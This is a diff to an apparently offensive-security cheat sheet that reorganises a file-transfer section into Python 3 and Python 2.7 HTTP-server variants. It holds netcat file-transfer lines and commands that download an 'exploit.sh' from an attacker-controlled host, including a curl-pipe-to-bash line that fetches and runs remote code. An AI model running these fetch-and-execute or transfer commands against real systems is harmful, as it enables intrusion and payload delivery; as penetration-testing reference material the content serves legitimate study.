@@ -793,11 +793,19 @@ C:\> nc.exe -nlvp 443 < file.txt
 $ nc -nv <IP address> 443 > file.txt
 ```
 
-- Python Server (Kali -> Windows/Kali)
+- Python Server 3 (Kali -> Windows/Kali)
 
 ```
-$ python -m SimpleHTTPServer 80
 $ python3 -m http.server 8000
+$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
+$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
+$ curl http://<IP address>:8000/exploit.sh | bash
+```
+
+- Python Server 2.7 (Kali -> Windows/Kali)
+
+```
+$ python2.7 -m SimpleHTTPServer 8000
 $ wget http://<IP address>:8000/exploit.sh -O exploit.sh
 $ curl http://<IP address>:8000/exploit.sh -o exploit.sh
 $ curl http://<IP address>:8000/exploit.sh | bash
